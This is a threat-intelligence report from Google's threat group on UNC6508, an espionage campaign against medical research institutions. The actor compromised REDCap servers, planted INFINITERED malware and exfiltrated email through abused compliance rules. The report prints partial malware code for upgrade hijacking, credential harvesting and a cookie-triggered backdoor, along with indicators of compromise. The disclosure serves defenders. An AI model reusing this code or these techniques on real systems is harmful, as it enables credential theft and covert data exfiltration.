class="nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-wNfPc-cGMI2b"><section class="DA9Qj nRhiJb-ObfsIf nRhiJb-fmcmS-oXtfBe"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-c5RTEf"></div><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c"><h5 class="cHE8Ub Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c">Google Threat Intelligence Group </h5><p class="nRhiJb-qJTHM khCp7b"></p></div></section></div></section><div class="nRhiJb-DARUcf"><div class="nRhiJb-ObfsIf nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-qWD73c-cGMI2b"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-ibL1re dzoHJ"><div class="aLW4J" track-metadata-module="left rail"><h5 class="qZDXV Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-wNfPc">Google Threat Intelligence</h5><p class="nRhiJb-cHYyed Mrfygc nRhiJb-BP2Omd-ma6Yeb-KE6vqe nRhiJb-DbgRPb-R6PoUb-cGMI2b">Visibility and context on the threats that matter most.</p><a class="nRhiJb-LgbsSe  nRhiJb-LgbsSe-OWXEXe-CNusmb-o6Shpd " href="https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest" track-metadata-module="left rail"track-metadata-module_headline="google threat intelligence" track-name="contact us &amp; get a demo"track-type="button"track-metadata-position="cta"track-metadata-eventdetail="cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest">Contact Us &amp; Get a Demo </a></div></div><div class="OYL9D nRhiJb-kR0ZEf-OWXEXe-GV1x9e-OiUrBf" jsname="tx2NYc"><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p>Written by: Patrick Whitsell, John McGuiness</p>
<hr></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p><span style="vertical-align:baseline">Google Threat Intelligence Group (GTIG) has identified a sophisticated campaign attributed to UNC6508, a People's Republic of China (PRC)-nexus threat actor, targeting institutions in the North American academic, medical, and military research community. While remaining undetected for over a year, the threat actor compromised externally facing web applications, deployed bespoke malware, pivoted to sensitive internal systems, and abused enterprise administrative tools for covert data exfiltration. The threat actor had broad collection aspirations, including sensitive defense intelligence related to national security, Indo-Pacific command operations, artificial intelligence, uncrewed vehicle systems, cyber offensive programs, and medical research. </span></p>
<p><span style="vertical-align:baseline">GTIG disrupted the malicious infrastructure associated with this threat actor. Working with Mandiant Consulting, we notified the affected organizations upon detection and offered our assistance with remediation. We have updated </span><a href="https://cloud.google.com/security/products/security-operations"><span style="text-decoration:underline;vertical-align:baseline">Google Security Operations</span></a><span style="vertical-align:baseline"> (SecOps) with relevant intelligence, enabling defenders to identify indicators of compromise (IOCs) within their networks. We encourage all users and customers to follow recommended best practices for </span><a href="https://knowledge.workspace.google.com/admin/apps/best-practices-for-third-party-idp-and-google-workspace-configuration" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">third-party Identity Providers</span></a><span style="vertical-align:baseline"> (IdP) and ensure </span><a href="https://knowledge.workspace.google.com/admin/security/about-2sv-enforcement-for-admins" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">2-Step Verification</span></a><span style="vertical-align:baseline"> (2SV) is enabled across all accounts.</span></p>
<h3><span style="vertical-align:baseline">Campaign Overview</span></h3>
<p><span style="vertical-align:baseline">The campaign targeted a diverse set of national, state, and private medical entities. These organizations comprise world-renowned clinical providers, premier academic centers, North American military health institutions, professional advocacy groups, and health regulatory bodies. Their research areas span a broad spectrum of modern medicine, from molecular discovery and clinical drug trials to state-level public health policy and military readiness. They employ thousands of people with a combined research budget in the billions of dollars.</span></p>
<p><span style="vertical-align:baseline">The earliest known compromise occurred in September 2023, after which GTIG observed a consistent operational pattern. The threat actor exploited externally facing </span><a href="http://project-redcap.org" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">REDCap</span></a><span style="vertical-align:baseline"> (Research Electronic Data Capture) servers and deployed custom malware named INFINITERED to capture legitimate REDCap login credentials. Then, after remaining undetected for more than a year, UNC6508 used the captured credentials to access the victim’s internal network. The threat actor was also observed using the novel technique of manipulating domain content compliance rules for data exfiltration. Lastly, UNC6508 used sophisticated operations security (OpSec) techniques to conceal and obfuscate their activity. </span></p>
<p><span style="vertical-align:baseline">GTIG collaborated closely with Mandiant Consulting, the FLARE team, and Workspace Security on this effort to combine our threat intelligence, incident response, and reverse engineering expertise across Google Cloud. This enabled us to develop a complete picture of the </span><a href="https://cloud.google.com/security/resources/insights/targeted-attack-lifecycle"><span style="text-decoration:underline;vertical-align:baseline">attack lifecycle</span></a><span style="vertical-align:baseline"> from initial compromise to complete mission. </span><span style="vertical-align:baseline">GTIG also extends thanks to the affected organizations for their cooperation and the valuable post-exploitation insights they shared.</span></p>
<h3><span style="vertical-align:baseline">Prevention, Detection, and Remediation</span></h3>
<p><span style="vertical-align:baseline">GTIG recommends defenders implement the following security measures, across all Cloud enterprise platforms, to mitigate this threat:</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Secure Admin Accounts</strong><span style="vertical-align:baseline">: Enforce phishing-resistant </span><a href="https://knowledge.workspace.google.com/admin/security/deploy-2-step-verification" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">2-Step Verification (2SV)</span></a><span style="vertical-align:baseline"> for enterprise administrator accounts, including through third-party Identity Providers.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Advanced Protection</strong><span style="vertical-align:baseline">: Consider enrolling highly sensitive accounts in our </span><a href="https://landing.google.com/intl/en_in/advancedprotection/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">Advanced Protection Program</span></a><span style="vertical-align:baseline"> for additional safeguards against malware and phishing attacks.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Prevent Cookie Theft</strong><span style="vertical-align:baseline">: Enforce </span><a href="https://knowledge.workspace.google.com/admin/security/prevent-cookie-theft-with-session-binding" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">Device Bound Session Credentials</span></a><span style="vertical-align:baseline"> (DBSC) with </span><a href="https://knowledge.workspace.google.com/admin/security/protect-your-business-with-context-aware-access" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">CAA</span></a><span style="vertical-align:baseline"> for highly sensitive accounts on Windows devices to prevent session hijacking.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Monitor Audit Logs</strong><span style="vertical-align:baseline">: Enable </span><a href="https://docs.cloud.google.com/logging/docs/audit/gsuite-audit-logging"><span style="text-decoration:underline;vertical-align:baseline">Audit logs</span></a><span style="vertical-align:baseline"> to analyze, monitor, and alert on changes to your data.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Control Data</strong><span style="vertical-align:baseline">: Define </span><a href="https://knowledge.workspace.google.com/admin/security/about-dlp" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">Data Loss Prevention (DLP) rules</span></a><span style="vertical-align:baseline"> to block or alert on external sharing of sensitive data.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Audit Compliance Rules</strong><span style="vertical-align:baseline">: Review </span><a href="https://knowledge.workspace.google.com/admin/reports/admin-log-events" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">Admin audit logs</span></a><span style="vertical-align:baseline"> and content compliance rules for unauthorized modifications.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">SIEM Coverage</strong><span style="vertical-align:baseline">: Consider using </span><a href="https://cloud.google.com/security/products/security-operations"><span style="text-decoration:underline;vertical-align:baseline">Google Security Operations</span></a><span style="vertical-align:baseline"> (SecOps) and ensure Workspace logs are included in your Security Information and Event Management (SIEM) pipeline.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Password Protection</strong><span style="vertical-align:baseline">: Use Chrome Enterprise </span><a href="https://support.google.com/chrome/a/answer/13597868?hl=en" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">Password Leak Detection</span></a><span style="vertical-align:baseline"> to alert when potentially compromised password use is detected.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Patch REDCap</strong><span style="vertical-align:baseline">: Fully updated REDCap installations to the latest software version and ensure older versions are completely removed.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Monitor for INFINITERED</strong><span style="vertical-align:baseline">: Scan REDCap servers for the presence of INFINITERED using the provided YARA rule and IOCs.</span></p>
</li>
</ul>
<h3><span style="vertical-align:baseline">Medical Research University Compromise</span></h3>
<p><span style="vertical-align:baseline">In September 2023, a </span><a href="http://project-redcap.org" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">REDCap</span></a><span style="vertical-align:baseline"> server belonging to a North American medical research institution was compromised. Continuing activity was observed through November 2025. During this time period, UNC6508 carried out the following attack chain.</span></p>
<ol>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Exploit the REDCap server.</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">After three months, deploy the INFINITERED malware.</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">INFINITERED stealthily records credentials, and persists through upgrades, for more than a year.</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Pivot to a domain admin account.</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Add the malicious content compliance rule.</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Silently “BCC-forward” matched emails to a threat actor-controlled account.</span></p>
</li>
</ol></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig1.max-2200x2200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig1.max-2200x2200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig1.max-2200x2200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig1.max-2200x2200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p>Figure 1: Campaign attack flow diagram</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h3><span style="vertical-align:baseline">Initial Access: REDCap Exploitation and INFINITERED</span></h3>
<p><span style="vertical-align:baseline">UNC6508 consistently targets REDCap servers. REDCap is a web-based software platform designed specifically for building and managing online databases and surveys, in compliance with regulations for medical and scientific research. It is a commonly used platform in the North American medical research community.</span></p>
<p><span style="vertical-align:baseline">GTIG was not able to confirm how UNC6508 initially gained access to the REDCap server. By design, REDCap allows administrators to continue running legacy software side-by-side with the current version. UNC6508 was observed probing for these vulnerable legacy versions on several target organizations’ REDCap systems. This highlights not only the increasing importance of rapidly applying security patches, but also promptly removing older software versions to prevent </span><a href="https://attack.mitre.org/techniques/T1689/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">downgrade attacks</span></a><span style="vertical-align:baseline">.</span></p>
<p><span style="vertical-align:baseline">Upon establishing a foothold on the REDCap server, UNC6508 performed internal reconnaissance and credential discovery to obtain database and service account credentials. The threat actor also deployed a web shell named "</span><span style="vertical-align:baseline">help.php</span><span style="vertical-align:baseline">", which maintained persistence and functioned as an uploader in the REDCap application.</span></p>
<h3><span style="vertical-align:baseline">INFINITERED Analysis</span></h3>
<p><span style="vertical-align:baseline">Three months after the initial compromise, UNC6508 deployed a custom malware payload tracked as INFINITERED. This malware implements its functionality across three distinct modular components by trojanizing legitimate REDCap system files.</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Dropper and Upgrade Interception </span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Credential Harvester</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Backdoor, with command and control (C2)</span></p>
</li>
</ul>
<p><span style="vertical-align:baseline">GTIG discovered multiple organizations across the US and Canada compromised with INFINITERED. All of these organizations were promptly notified of the compromise upon detection and offered our assistance with remediation.</span></p></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig2a.max-2100x2100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig2a.max-2100x2100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig2a.max-2100x2100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig2a.max-2100x2100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p>Figure 2: INFINITERED diagram</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h4><span style="vertical-align:baseline">Dropper and Upgrade Interception</span></h4>
<p><span style="vertical-align:baseline">To maintain persistent remote access, INFINITERED injects its code into new REDCap versions by intercepting the upgrade process. This capability is embedded into the legitimate REDCap upgrade system file. INFINITERED performs this code injection following these steps.</span></p>
<ol>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Read the current software version, which includes the INFINITERED code. </span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Extract the malicious logic using GUID delimiter </span><span style="vertical-align:baseline">b49e334d-9c01-463e-9bc5-00a6920fb66e.</span><span style="vertical-align:baseline"> </span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Inject backdoor code into the custom hooks configuration file. </span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Inject credential harvester code into the authentication system file.</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Inject the extracted code from step 2 into the upgrade system file.</span></p>
</li>
</ol>
<p><span style="vertical-align:baseline">In Elastic Beanstalk environments, INFINTERED performs additional steps to ensure persistence in cloud deployments. </span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><pre><code>// b49e334d-9c01-463e-9bc5-00a6920fb66e
...
$file_upgrade = $base_path.&quot;Upgrade.php&quot;; 
$file_content_upgrade = $zip-&gt;getFromName($file_upgrade); // new upgrade file content
$file_content_upgrade_local = file_get_contents(__FILE__); // Contents of the current file 
...
if ($file_content_upgrade !== false) {
    // Base64 GUID delimiter
    $dummy_marker = base64_decode(&#39;YjQ5ZTMzNGQtOWMwMS00NjNlLTliYzUtMDBhNjkyMGZiNjZl&#39;);
    $pattern = &quot;/$dummy_marker(.*?)$dummy_marker/s&quot;;
    if (preg_match($pattern, $file_content_upgrade_local, $matches)) {
        $extracted_text = $matches[0];
        $search_content = &quot;// If running on AWS Elastic Beanstalk&quot;; 
        $upgrade_decode = &quot;// &quot;.$extracted_text.&quot;\r\n\t\t&quot;.$search_content;
        $new_content = str_replace($search_content, $upgrade_decode, $file_content_upgrade);
        $zip-&gt;deleteName($file_upgrade);
        $zip-&gt;addFromString($file_upgrade, $new_content);
    }
}
$zip-&gt;close();
...
// b49e334d-9c01-463e-9bc5-00a6920fb66e</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%"><span style="vertical-align:baseline">Code Snippet 1: Intercept upgrades and inject INFINITERED code</span></span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h4><span style="vertical-align:baseline">Credential Harvester</span></h4>
<p><span style="vertical-align:baseline">INFINITERED injects a credential harvester into the authentication system file to compromise user accounts. This component of the malware captures usernames and passwords submitted via POST requests during the login process. The credentials are encrypted using the environment’s default encryption routine and hidden inside a local REDCap sessions database table with the string “</span><span style="vertical-align:baseline">xc32038474a” </span><span style="vertical-align:baseline">prefixed to the Session ID. </span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><pre><code>$currentUTC = gmdate(&#39;Y-m-d H:i:s&#39;);
$str = encrypt($currentUTC . &#39;[::]&#39; . $_POST[&#39;username&#39;] . &#39;[::]&#39; . $_POST[&#39;password&#39;]);
include dirname(__FILE__, 3) . DIRECTORY_SEPARATOR . &#39;redcap_connect.php&#39;;
$expiration_timestamp = strtotime(&quot;+60 days&quot;, strtotime($currentUTC));
$session_id = &#39;xc32038474a&#39;.substr(bin2hex($currentUTC), -20);
$session_sql = &quot;INSERT INTO [REDACTED] ([REDACTED],[REDACTED],[REDACTED]) VALUES (&#39;$session_id&#39;, &#39;$str&#39;, FROM_UNIXTIME($expiration_timestamp))&quot;;
@$rc_connection-&gt;query($session_sql);</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%"><span style="vertical-align:baseline">Code Snippet 2: Hide credentials in a legitimate database table</span></span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h4><span style="vertical-align:baseline">Backdoor</span></h4>
<p><span style="vertical-align:baseline">INFINITERED also has backdoor functionality it establishes in the custom hooks system file inside the update package, specifically within a function that executes on every REDCap page load. This global hook ensures the backdoor runs on every page load. INFINITERED looks for a specific HTTP Cookie parameter named "</span><span style="vertical-align:baseline">REDCAP-TOKEN</span><span style="vertical-align:baseline">" and a cookie value starting with a specific plaintext string. If these conditions are present, the malware strips the prefix and decrypts the remaining payload with the environment's default decryption routine.</span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><pre><code>$cookieValue = $_COOKIE['REDCAP-TOKEN'];
if ($cookieValue) {
    $magic_flag = '[REDACTED]'; // Cookie prefix
    ...
    // Decrypt message if cookie prefix is found
    $key = '[REDACTED]';
    $req_data = substr($cookieValue, strlen($magic_flag));
    $req_data = decrypt($req_data, $key);</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%"><span style="vertical-align:baseline">Code Snippet 3: Decrypting commands to INFINITERED</span></span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p><span style="vertical-align:baseline">If the decrypted payload is empty, the malware acts as a beacon, returning system details such as the OS, PHP version, working directory, and database credentials including the hostname, username, password, and salt. When non-empty, the malware will parse the payload for command tags, which the threat actor can use to execute shell commands, run raw SQL queries, and transfer files.</span></p>

<p style="text-align:center"><span style="vertical-align:baseline;color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Table 1: Supported commands for INFINITERED</span></p>
</div></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h3><span style="vertical-align:baseline">Domain Content Compliance Rule Abuse</span></h3>
<p><span style="vertical-align:baseline">More than a year after the initial compromise, UNC6508 used overlapping credentials, harvested from REDCap, to access an administrator account. This underscores the challenge and importance of securing systems holistically. Defenders should enable </span><a href="https://knowledge.workspace.google.com/admin/security/deploy-2-step-verification" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">2-Step Verification (2SV)</span></a><span style="vertical-align:baseline"> and ensure unique credentials are used across different security domains to mitigate credential replay attacks.</span></p>
<p><span style="vertical-align:baseline">UNC6508 then leveraged </span><a href="https://knowledge.workspace.google.com/admin/gmail/advanced/set-up-rules-for-advanced-email-content-filtering#compliance_rules" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">content compliance rules</span></a><span style="vertical-align:baseline">, a legitimate feature present in many cloud-based enterprise productivity suites, to exfiltrate specific email communications. Administrators can create these rules to manage email messages that contain content matching predefined sets of words, phrases, text patterns, or numerical patterns. By default, compliance rules apply to all users in an organizational unit. The use of compliance rules for data exfiltration is a novel technique not previously observed with PRC-nexus threat actors.</span></p>
<p><span style="vertical-align:baseline">Specifically, UNC6508 created a compliance rule named "</span><span style="vertical-align:baseline">Patroit</span><span style="vertical-align:baseline">" [sic] that used regular expressions to match on keyword and email address patterns in sent or received emails. Matches were silently BCC-forwarded to a threat actor-controlled Gmail address, </span><span style="vertical-align:baseline">BebitaBarefoot774[@]gmail[.]com</span><span style="vertical-align:baseline">, providing a covert and continuous stream of exfiltrated data. Upon discovery, GTIG disabled the Gmail account to prevent further data exfiltration.</span></p></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig3.max-2100x2100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig3.max-2100x2100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig3.max-2100x2100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig3.max-2100x2100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p>Figure 3: Targeted intelligence collection categories</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p><span style="vertical-align:baseline">The patterns used in the “Patroit” compliance rule suggest strategic intelligence collection targeting geo-strategic policy, military strategy, advanced technology, and medical research. The patterns also include professional email addresses and phone numbers for members of organizations in these spaces. Several of the terms applied have spelling errors, suggesting the list was manually maintained. </span></p>
<p><span style="vertical-align:baseline">This ambitious scope of intelligence collection from UNC6508 may suggest a broader range of targets beyond the identified victims in the medical research community. GTIG assesses these collection priorities are aligned with the strategic interests of the People's Republic of China. </span></p>
<p><span style="vertical-align:baseline">While most of the terms relate to defense and technology, the terms including medical research facilities, and the specific pathogen “Chikungunya,” stand out from the others. Chikungunya is a viral disease transmitted to humans from mosquitos and was responsible for an </span><a href="https://www.unmc.edu/healthsecurity/transmission/2025/09/30/explosive-chikungunya-virus-outbreak-in-china/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">outbreak in China's Guangdong province</span></a><span style="vertical-align:baseline"> beginning in July 2025.</span></p>
<h3><span style="vertical-align:baseline">Operations Security (OpSec)</span></h3>
<p><span style="vertical-align:baseline">GTIG observed UNC6508 use sophisticated and meticulous OpSec techniques to conceal their activities from defenders. </span></p></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig4.max-2200x2200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig4.max-2200x2200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig4.max-2200x2200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/inifinitered-fig4.max-2200x2200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p>Figure 4: UNC6508 operations security techniques</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p><span style="vertical-align:baseline">UNC6508 relied heavily on Obfuscation (OBF) networks. This strategy, now frequently employed by PRC-nexus actors, involves routing traffic from offensive operations through a mix of compromised routers, residential proxies, Virtual Private Servers (VPS), and other devices.  </span></p>
<p><span style="vertical-align:baseline">This operation used exclusively US-based OBF network IP addresses to access both the "</span><span style="vertical-align:baseline">BebitaBarefoot774[@]gmail[.]com</span><span style="vertical-align:baseline">" account and when replaying legitimate credentials to access the compromised enterprise administrator account. Additional OpSec techniques were also used, such as obtaining the threat actor-controlled Gmail account through a mass creation service and dedicating it exclusively to email data exfiltration.</span></p>
<p><span style="vertical-align:baseline">By maintaining a high level of OpSec, UNC6508 significantly complicates the efforts of defenders to identify malicious patterns, establish accurate attribution, and map the threat actor’s infrastructure.</span></p>
<h3><span style="vertical-align:baseline">Attribution</span></h3>
<p><span style="vertical-align:baseline">GTIG attributes this activity to UNC6508 with high confidence. This assessment is based on infrastructure overlaps between campaigns, the consistent use of the INFINITERED backdoor on REDCap servers, and the specific targeting of medical research and defense sectors. We assess UNC6508 is an espionage motivated threat cluster, with priorities that align with historic PRC state-sponsored espionage trends and intelligence collection requirements.</span></p>
<h3><span style="vertical-align:baseline">Indicators of Compromise (IOCs)</span></h3>
<p><span style="vertical-align:baseline">To assist the wider community, we have also included a list of indicators in a <a href="https://www.virustotal.com/gui/collection/f3a266bed2b73690459e30a2e52e5afd4bc36ea83197ab8bf3d5cb17095a7eef" rel="noopener" target="_blank">GTI Collection</a> for registered users.</span></p>

